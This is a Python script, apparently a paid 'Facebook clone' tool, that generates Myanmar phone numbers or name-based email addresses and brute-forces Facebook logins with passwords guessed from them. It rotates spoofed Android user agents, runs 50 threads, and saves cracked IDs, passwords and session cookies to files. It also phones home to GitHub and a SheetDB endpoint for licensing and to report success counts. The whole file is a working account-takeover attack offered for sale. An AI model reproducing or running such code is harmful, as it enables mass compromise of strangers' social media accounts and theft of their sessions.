import random, requests , re , sys , os , time, getpass
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')


#----------User Access Controler----------#👇

# import os, getpass, requests, sys

approval_description = ("""
\033[0mTo buy this tool,
\033[0mplease connect from Facebook or Telegram.

\033[0mFacebook acc:  https://www.facebook.com/sknaing29
\033[0mFacebook page: https://www.facebook.com/MyanService
\033[0mTelegram acc:  https://t.me/YeMoeThaung
\033[0mTelegram page: https://t.me/MyanService
""")

print("Loading...")
url = "https://raw.githubusercontent.com/mejoinpar333/Fb_Clone_Tools_Data/main/ApprovedUsers.txt"
response = requests.get(url)
approved_users = response.text

user_id = str(os.geteuid())
user_name = getpass.getuser()
key = user_id + user_name

if key in approved_users:
    print("\nYour key: " + key)
    print("Your key is approved")
    # time.sleep(2)
else:
    print("\nYour key: " + key)
    print("Your key is not approved")
    print(approval_description)
    sys.exit()

#----------User Access Controler----------#👆

#----------OK ACCOUNT RECORDER----------#👇

# import os, requests, sys, getpass
# from datetime import datetime

current_date = datetime.now().strftime("%Y-%m-%d")

# Function to save data
def save_data(filename, data):
    home_path = os.path.expanduser('~')  # Gets the user's home directory
    file_path = os.path.join(home_path, filename)  # Path to the file
    with open(file_path, 'w') as file:
        file.write(data)

# Function to load data
def load_data(filename):
    home_path = os.path.expanduser('~')  # Gets the user's home directory
    file_path = os.path.join(home_path, filename)  # Path to the file
    try:
        with open(file_path, 'r') as file:
            data = file.read()
        return data
    except FileNotFoundError:
        return "0"  # File not found.

last_ran_date = load_data(".last_ran_date")

def post_data_to_sheetdb():
    try:
        url = "https://raw.githubusercontent.com/mejoinpar333/Fb_Clone_Tools_Data/main/sheetdb_api_for_ok_recorder.txt"
        response = requests.get(url)
        api_url = response.text
        clean_string = api_url.replace(" ", "").replace("\n", "")
        api_url = clean_string
    except requests.exceptions.RequestException as e:
        # print(f"Request error: {e}")
        pass

    number_of_ok = load_data(".number_of_ok")
    date = last_ran_date
    if date == "" or date == "0":
        date = "0000-00-00"
    
    user_id = str(os.geteuid())
    user_name = getpass.getuser()
    key = user_id + user_name

    data = {
        "number_of_ok": number_of_ok,
        "date": date,
        "key": key,
        "version": "P3",
    }

    response = requests.post(api_url, json={"data": data})
"""
    if response.status_code == 201:
        print("Data successfully added.")
    else:
        print(f"Failed to add data. Status code: {response.status_code}, Response: {response.text}")
""" 
def limit_id_loading():
    if last_ran_date == current_date:
        pass
    else:
        post_data_to_sheetdb()
        save_data(".last_ran_date", current_date)
        save_data(".number_of_ok", "0")

def number_of_ok():
    number_of_ok = load_data(".number_of_ok")
    int_value = int(number_of_ok)
    add_one = int_value + 1
    number_of_ok = str(add_one)
    save_data(".number_of_ok", number_of_ok)

limit_id_loading()

# You need to call the number_of_ok() function while obtaining an 'OK' account.

#----------OK ACCOUNT RECORDER----------#👆

loop = 0
oks = []
cps = []
twf =[]
ugen = []
ugen = []

cokbrut=[]
ses=requests.Session()

	
A = '\x1b[1;97m' 
B = '\033[1;32m' 
C = '\x1b[1;91m' 
D = '\033[38;5;46m'
M = '\033[1;31m'
H = '\033[38;5;46m'
N = '\x1b[1;37m'    
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;37m'

dev_info = ("""
\033[1;97mFacebook acc:  \033[1;22mhttps://www.facebook.com/sknaing29
\033[1;97mFacebook page: \033[1;22mhttps://www.facebook.com/MyanService
\033[1;97mTelegram acc:  \033[1;22mhttps://t.me/YeMoeThaung
\033[1;97mTelegram page: \033[1;22mhttps://t.me/MyanService
""")

def main():
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m1\033[1;32m❯ \033[1;97mPHONE NUMBER CLONE          ")
    print("\033[1;32m  ❮\033[1;97m2\033[1;32m❯\033[1;97m GMAIL UID CLONE               ")
    print("\033[1;32m  ❮\033[1;97mi\033[1;32m❯ \033[1;97mDEV'S INFO                    ")
    print("\033[1;32m  ❮\033[1;97m0\033[1;32m❯ \033[1;31mEXIT TOOL                     ")
    linex()
    ZWE = input(f'\033[1;32m  ❮\033[1;97m?\033[1;32m❯ \033[1;97mSELECT \033[1;97m:\033[1;32m ')
    if ZWE in ["1","01"]:
        phone()
    if ZWE in ["2","02"]:
        gmail_four()
    if ZWE in ["i","I"]:
        print(dev_info)
    if ZWE in ["0","X"]:        
        os.system('exit')
def phone():
    user=[]
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97m EXAMPLE : \033[1;32m❮\033[1;97m789\033[1;32m❯ ❮\033[1;97m440\033[1;32m❯ ❮\033[1;97m670\033[1;32m❯")
    linex()
    code = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97m INPUT YOUR CODE :\033[1;32m ')
    os.system('clear')
    print(logo)
    print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯")
    linex()
    limit=int(input("\033[1;32m  ❮\033[1;32m?\033[1;32m❯\033[1;97m INPUT YOUR LIMIT :\033[1;32m "))
    
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    with ThreadPool(max_workers=50) as LEE:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'                   ')
        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCHOICE CODE    \x1b[38;5;45m⦿ \033[1;32m'+code+'             ')
        print(f"\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
        linex()
        for love in user:
            country_code = "09"
            uid = "+959"+code+love
            pwx = [country_code + code + love, code + love, (country_code + code + love)[:6], (code + love)[:6]]
            # pwx = [country_code + code + love, (country_code + code + love)[::-1], code + love, (code + love)[::-1], (country_code + code + love)[:8], (code + love)[:8], (country_code + code + love)[:6], (code + love)[:6]]
            # pwx.extend(["123456", "12345678", "123456789", "abc123", "123abc", "password", "qwerty", "abcdef", "1qaz2wsx", "facebook", "account", "myanmar", "iloveyou", "fuckyou"])
            LEE.submit(rcrack,uid,pwx,tl)

def gmail_four():
                user=[]
                os.system('clear')
                print(logo)               
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mtun\033[1;32m❯ ❮\033[1;97mzaw\033[1;32m❯ ❮\033[1;97maung\033[1;32m❯ ")
                linex()
                first = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mFIRST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97mlin\033[1;32m❯ ❮\033[1;97mhtet\033[1;32m║ ❮\033[1;97mmin\033[1;32m❯ ")
                linex()
                last = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mLAST NAME :\033[1;32m ')
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m@gmail.com\033[1;32m❯ ❮\033[1;97m@yahoo.com\033[1;32m❯ ")
                linex()
                domain = input('\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT DOMAIN :\033[1;32m ')               
                os.system('clear')
                print(logo)
                print("\033[1;32m  ❮\033[1;97m✔\033[1;32m❯\033[1;97mEXAMPLE : \033[1;32m❮\033[1;97m3000\033[1;32m❯ ❮\033[1;97m5000\033[1;32m❯ ❮\033[1;97m10000\033[1;32m❯ ")
                linex()
                try:
                        limit=int(input("\033[1;32m  ❮\033[1;97m?\033[1;32m❯\033[1;97mINPUT YOUR LIMIT :\033[1;32m "))
                except ValueError:
                        limit = 5000
                for nmbr in range(limit):
                        nmp="".join(random.choice(string.digits) for _ in range(1,5))
                        user.append(nmp)                               
                with ThreadPool(max_workers=50) as LEE:
                        tl = str(len(user))
                        os.system('clear')
                        print(logo)
                        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mTOTAL ID       \x1b[38;5;45m⦿ \033[1;32m'+tl+'  ')
                        print(f'\033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97mCRACK NAME     \x1b[38;5;45m⦿ \033[1;32m'+first+'.'+last+'.xxxx'+domain+'')
                        print(f"  \033[1;32m  ❮\033[1;97m✔\033[1;32m❯ \033[1;97m\033[1;97 IIf No Result\033[1;97m[\033[1;32mON\033[1;32m\033[1;97m/\033[1;32mOFF\033[1;97m]\033[1;97mAirplane Mode..\033[1;32m!!!")
                        linex()
                        for digitx in user:                       
                                uid=first+'.'+last+'.'+digitx+domain
                                pwx=[digitx+first+last,first+last+digitx,first+digitx,last+digitx,first+last,first+' '+last,first+'123',first+'1234',first+'12345',first+'1122',first+last+'123',first+last+'1234',last+'123',last+'1234',last+'12345',last+'1122']
                                LEE.submit(rcrack,uid,pwx,tl)                
    
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    global chrome_version
    global android_version
    global model
    try:
        for ps in pwx:
            session = requests.Session()
            pro = generate_custom_user_agent()
            bi = random.choice([A,B,C,D,E,F,G,H])
            sys.stdout.write(f'\r\r\033[1;32m  ❮%sMYAN-2\033[1;32m❯\033[1;34m\033[1;32m ❮\033[38;5;195m%s/%s\033[1;32m❯\033[1;32m OK-%s\r'%(bi,loop,tl,len(oks))),            
            sys.stdout.flush()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            chrome_major_version = chrome_version.split('.')[0]
            android_version = android_version + ".0.0"
            header_freefb = {
                'authority': 'm.facebook.com',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
                'cache-control': 'max-age=0',
                'dpr': '2.625',
                'sec-ch-prefers-color-scheme': 'dark',
                'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="' + chrome_major_version + '"',
                'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="' + chrome_version + '"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"' + model + '"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"' + android_version + '"',
                'sec-fetch-dest': 'document',
                'sec-fetch-mode': 'navigate',
                'sec-fetch-site': 'none',
                'sec-fetch-user': '?1',
                'upgrade-insecure-requests': '1',
                'user-agent': pro,
                'viewport-width': '980',
            }
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = re.findall('c_user=(.*);xs', coki)[0]
                print(f"\033[1;32m  ❮✔❯ {uid} ⦿ {ps}" '  \n\033[1;97m❮COOKIE❯ = \033[1;97m'+coki+  '')
                linex()
                open('/sdcard/MYAN-2-OK.txt', 'a').write( uid + ' | ' + ps + '\nCookie = ' + coki + '\nUser-Agent = ' + pro + '\n\n')
                oks.append(uid)
                number_of_ok()
                break
            elif 'checkpoint' in log_cookies:            	
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                uid = coki[82:97]
                print(f"\x1b[1;90m  ❮✘❯ {uid} ⦿ {ps}")
                #print(f'\033[1;31m❮COOKIE❯ = {coki}')
                open('/sdcard/MYAN-2-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break            
            else:
                continue
        loop+=1
        
    except:
        pass
        

def generate_custom_user_agent():
    global chrome_version
    global android_version
    global model
    # Define a list of device configurations, each with paired details
    device_configurations = [
        {'model': 'SM-G991B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-G998B', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-S906N', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-S908B', 'android_version': '13', 'build': 'SP1A.210812.016'},
        {'model': 'SM-F926B', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-F711B', 'android_version': '13', 'build': 'TP1A.220624.014'},
        {'model': 'SM-A125U', 'android_version': '10', 'build': 'QP1A.190711.020'},
        {'model': 'SM-A426U', 'android_version': '12', 'build': 'SP1A.210812.016'},
        {'model': 'SM-A725F', 'android_version': '11', 'build': 'RP1A.200720.012'},
        {'model': 'SM-A135F', 'android_version': '12', 'build': 'SP1A.210812.016'},
    ]
    
    # Please add the all facebook versions from file to list and give me modify list.
    # Example - fb_versions = ['70.0.3538.77', '80.0.3987.149', '90.0.4430.212', '89.0.4389.82', '88.0.4324.181', all versions from file]
    chrome_versions = ['60.0.3112.107', '61.0.3163.98', '70.0.3538.77', '74.0.3729.112', '80.0.3987.149', '88.0.4324.181', '89.0.4389.82', '90.0.4430.212', '103.0.5060.129', '104.0.5112.97', '105.0.5195.68', '105.0.5195.79', '105.0.5195.124', '106.0.5249.65', '106.0.5249.79', '106.0.5249.118', '106.0.5249.126', '107.0.5304.91', '107.0.5304.105', '107.0.5304.141', '108.0.5359.128', '109.0.5414.86', '109.0.5414.117', '110.0.5481.64', '110.0.5481.154', '111.0.5563.48', '111.0.5563.57', '111.0.5563.115', '112.0.5615.48', '112.0.5615.100', '112.0.5615.101', '112.0.5615.136', '113.0.5672.77', '113.0.5672.131', '114.0.5735.53', '114.0.5735.58', '114.0.5735.61', '114.0.5735.131', '115.0.5790.136', '115.0.5790.138', '115.0.5790.139', '116.0.5845.92', '116.0.5845.114', '116.0.5845.172', '116.0.5845.173', '117.0.5938.140', '117.0.5938.153', '118.0.5993.80', '118.0.5993.81', '119.0.6045.163', '119.0.6045.193', '120.0.6099.43', '120.0.6099.44', '120.0.6099.194', '120.0.6099.211', '121.0.6167.101', '121.0.6167.164', '122.0.6261.43', '122.0.6261.90']
    fb_versions = ['200.0.0.50.120', '300.0.0.59.122', '381.0.0.29', '382.0.0.33', '383.0.0.23', '384.1.0.29', '385.0.0.32', '386.0.0.35', '387.0.0.24', '388.0.0.32', '389.0.0.42', '390.0.0.27', '391.0.0.33', '391.1.0.37', '392.0.0.32', '392.2.0.33', '394.0.0.50', '394.1.0.51', '395.0.0.27', '396.0.0.21', '396.1.0.28', '397.0.0.23', '398.0.0.21', '399.0.0.24', '400.0.0.37', '400.0.0.73.129', '401.0.0.24', '402.0.0.21', '403.0.0.27', '404.0.0.35', '405.0.0.23', '405.1.0.28', '406.0.0.26', '407.0.0.30', '408.1.0.36', '409.0.0.27', '410.0.0.26', '411.1.0.29', '412.0.0.22', '413.0.0.30', '414.0.0.30', '415.0.0.34', '416.0.0.35', '417.0.0.33', '418.0.0.33', '419.0.0.29', '419.0.0.37', '420.0.0.32', '426.0.0.26', '427.0.0.31', '443.0.0.23', '445.0.0.34', '450.0.0.42', '454.0.0.0']

    # Randomly select a device configuration
    device_config = random.choice(device_configurations)

    # Extract details from the chosen configuration
    model = device_config['model']
    android_version = device_config['android_version']
    build = device_config['build']
    
    chrome_version = random.choice(chrome_versions)
    fb_version = random.choice(fb_versions)

    # Construct the user agent string using the extracted details
    ua = (
        f"Mozilla/5.0 (Linux; Android {android_version}; {model} Build/{build}; wv) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{chrome_version} "
        f"Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/{fb_version};]"
    )
    
    return ua
    
    
logo= ("""
\033[1;22mMozilla-StandardA1 ug-header SCRAPE v2 P3
\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
\033[38;5;45m┃  ███    ███ ██    ██  █████  ███    ██     ██████   ┃
\033[38;5;44m┃  ████  ████  ██  ██  ██   ██ ████   ██          ██  ┃
\033[38;5;43m┃  ██ ████ ██   ████   ███████ ██ ██  ██      █████   ┃
\033[38;5;42m┃  ██  ██  ██    ██    ██   ██ ██  ██ ██     ██       ┃
\033[38;5;41m┃  ██      ██    ██    ██   ██ ██   ████     ███████  ┃
\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
\033[38;5;45m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mOWNER           \033[38;5;41m ━━━━━    \033[1;32m MyanService          \033[38;5;45m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTELEGRAM        \033[38;5;41m ━━━━━   \033[1;32m @MyanService          \033[38;5;43m┃
\033[38;5;43m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mMETHOD          \033[38;5;41m ━━━━━   \033[1;32mSCRAPE METHOD          \033[38;5;43m┃
\033[38;5;44m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL STATUS     \033[38;5;41m ━━━━━    \033[1;32mPAID VERSION          \033[38;5;44m┃
\033[38;5;42m┃\033[1;32m [\033[1;91m❃\033[1;32m] \033[1;97mTOOL VERSION    \033[38;5;41m ━━━━━     \033[1;32m      1.0.0          \033[38;5;42m┃
\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
def linex():
	print(f'\033[1;97m ══════════════════════════════════════════════════════')

main()
